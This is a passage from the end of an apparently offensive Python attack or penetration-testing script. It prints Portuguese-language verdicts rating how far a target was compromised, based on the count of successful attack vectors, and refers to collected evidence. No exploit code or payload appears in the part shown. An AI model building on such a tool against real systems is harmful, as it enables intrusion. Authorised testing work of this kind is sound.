            print("🔴 ATAQUE CRÍTICO: Alta probabilidade de comprometimento")
        elif success_count >= 4:
            print("🟠 ATAQUE SIGNIFICATIVO: Comprometimento parcial provável")
        elif success_count >= 2:
            print("🟡 ATAQUE BÁSICO: Algumas vulnerabilidades exploradas")
        else:
            print("🔵 ATAQUE LIMITADO: Poucos vetores explorados")
            
        print("\nVerificar diretório de resultados para evidências coletadas.")
        print("="*80)
        
        return success_count >= 4


if __name__ == "__main__":
    main()